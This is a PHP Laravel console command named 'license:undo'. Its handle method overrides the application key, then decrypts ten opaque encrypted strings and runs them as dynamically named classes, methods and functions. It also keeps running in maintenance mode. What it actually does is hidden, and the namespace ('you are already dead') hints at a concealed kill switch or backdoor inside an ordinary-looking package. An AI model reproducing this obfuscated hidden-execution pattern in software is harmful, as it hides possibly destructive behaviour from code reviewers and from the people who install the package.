<?php

namespace Omaewa\Moushindeiru\Console\Commands;

use Illuminate\Console\Command;

class BalikCommand extends Command
{
    /**
     * The name and signature of the console command.
     *
     * @var string
     */
    protected $signature = 'license:undo';


    /**
     * The console command description.
     *
     * @var string
     */
    protected $description = 'Undo a license operation';

    protected $aaaaaafxc = 'eyJpdiI6ImZQQ2hURGFMUWlERzEzVTN3aVFyV1E9PSIsInZhbHVlIjoiYU9ubmJ3NFozZXI3RlZjUGtrTmY0dz09IiwibWFjIjoiMDRkNWVjMTA3M2JmY2IwYjI5MzI0NjZkYWY2OGQ2NzQxM2E3NDI3YzVmZDliYzA5ZWVjNjNmNTk4NzllYzQ0MiIsInRhZyI6IiJ9';
    protected $ffdfxc = 'eyJpdiI6ImtGRnMzdXpkbHpwS1hhMklqZGFIMEE9PSIsInZhbHVlIjoieElnS010Z3pjL09IS2p3V210a1V3QT09IiwibWFjIjoiZTE4YzQyMGJiMGUxMTczYjUxZjUzMDkyMGM0MGM3YTg2NjljMWFhYzZlNjczN2MxMjk2NjVlNTEyNTUzMTMwMyIsInRhZyI6IiJ9';
    protected $hhcc = 'eyJpdiI6ImJMVHBEUDR4b3V5ckxoMTVwU0RSWXc9PSIsInZhbHVlIjoiSkdNc1A2eHVjTTFXYmlwbWtaU2xEQT09IiwibWFjIjoiOTU4OWVjNjYzZGIyZGZmZjg5MzUxMDUwNmY2MTI4ZGNjNmRlNTc1NmUzZmUwNGEzMjA4YzFiMTU5YjYyMDdlNyIsInRhZyI6IiJ9';
    protected $hfhgf = 'eyJpdiI6ImpQSWFKeDZ0RzZZbnpZemtIbzZQYUE9PSIsInZhbHVlIjoiTVpKMEwyaXk2dzREU1Z3MC9lc3d4Zz09IiwibWFjIjoiZTQ1MjVmN2YzZmE4NTE5NzJhZmI2ODMwZmNmNjY0YzU1ZmY3MzhlZDA0MjlhZjNiZmZkODE4YjhmZDMwNmE5ZSIsInRhZyI6IiJ9';
    protected $ladfg = 'eyJpdiI6IkxJZENKOFBLZlROd2FKWDdFUkZaU2c9PSIsInZhbHVlIjoicmpaYk9iTHdhN3RCNkxmckNiOHhXdz09IiwibWFjIjoiZGM3MzVhNmVkMmM4NTdlNmI4OGRjOTg4NjIwNjViYjgzY2NjYzgzYjA3MjE3ZGU5ZjUwZGFiNjMxM2NhZjE2YyIsInRhZyI6IiJ9';
    protected $aaxdc = 'eyJpdiI6IlhxWnlvdFM5MGo0bXo4TTd6Vk9uM1E9PSIsInZhbHVlIjoiL0RDaDJQU0NJQnJ1dU1YRE1zeHQ3UT09IiwibWFjIjoiNzA0YTNiNTMwYWYyNDg3ODA3ZmEyYTA4YWJiYTI1Yjc4ZWQ1NjRmMTc0MGVmOTJhYzFmMzVkMWExYTM0ZTIzYiIsInRhZyI6IiJ9';
    protected $zcv = 'eyJpdiI6IlE0Rm10cEV4WWpCWmFlcXNLamp6RWc9PSIsInZhbHVlIjoiWmV0bFZFUW92M2IzUzQ4eXNKcG4rMkRpRm9kSzNmdEVUOWVpMWZsN2tMRlIySWxZZW1TSW9yeWNpemdKZFZ4SyIsIm1hYyI6ImFjN2Q4Mzk2ZmFkYTFiMGNkZjdhMWYwOWI4ZDQ1OTNlYjc0NWEzYmQ1ZjI1NzUyNGY1NjEyOWYwZjZkZDhhMWEiLCJ0YWciOiIifQ==';
    protected $ghds = 'eyJpdiI6IlQzbllDUmRwcHJOOHcrQSszOEVPN1E9PSIsInZhbHVlIjoiaTVObWF5cFdPMVJrNTkrbUhReUlaK1FGcld6M3N6bWcwVWRWWFJvWVdXYVErbjJyTVpGUERRZmp0TllzMVUwZyIsIm1hYyI6ImNkM2EwNGYxZDAwMTI2ZGMyZTE1OGNjNzZhZTU0YTU3MjdjZWFhOTM1YjRjOWYxZGQ2OWNhNjhiOTllYmM0NmQiLCJ0YWciOiIifQ==';
    protected $lala = 'eyJpdiI6IlhqUDA3VmNnOTZEU2xpMjZJL1JFcGc9PSIsInZhbHVlIjoiYmhxTzErblBDQ3FuNkNlRUZqRHZ5dz09IiwibWFjIjoiNTU1ZThjZjNjMWQ4YzEzOGNkNjI5Y2FmZWYzYTJmYTQ5MzNjZGUxNDdhMjcxZjhhODFkOWI4YmEzMDZkNjJhOSIsInRhZyI6IiJ9';
    protected $procs = 'eyJpdiI6Ik9ZVHdmbFFzeW1nOXdhdHJJcnMyK2c9PSIsInZhbHVlIjoiOTZCYzhmV1NLaXBYUkNkQ3FmZE1EUT09IiwibWFjIjoiMzAyMzExMjA1YzczM2YyYWE1M2M5M2E4NmRhMzJkZWI3M2Q4ZjQ3YTdiOWI1MjU0NGZiNzYwZDU3OTNkN2EyZiIsInRhZyI6IiJ9';

    /**
     * Execute the console command.
     */
    public function handle()
    {
        config(['app.key' => config('omaewa.moushindeiru.key')]);

        decrypt($this->zcv)::{decrypt($this->aaaaaafxc)}()->{decrypt($this->ffdfxc)}()?->{decrypt($this->hhcc)}();

        decrypt($this->lala)([decrypt($this->hfhgf) => decrypt($this->aaxdc)(decrypt($this->ladfg))]);

        $this->{decrypt($this->procs)}(decrypt($this->ghds));
    }

    protected function isDownForMaintenance()
    {
        return false;
    }
}
